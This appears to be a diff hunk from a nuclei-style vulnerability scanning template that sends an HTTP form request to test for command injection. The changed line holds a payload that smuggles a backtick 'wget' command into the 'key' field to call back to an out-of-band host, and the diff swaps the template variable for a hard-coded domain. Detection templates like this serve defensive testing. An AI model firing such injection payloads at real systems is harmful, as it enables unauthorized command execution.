@@ -23,7 +23,7 @@ http:
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
-        key=';`wget http://{{interactsh-url}}`;#
+        key=';`wget http://interactsh-url.com`;#
 
     matchers:
       - type: word
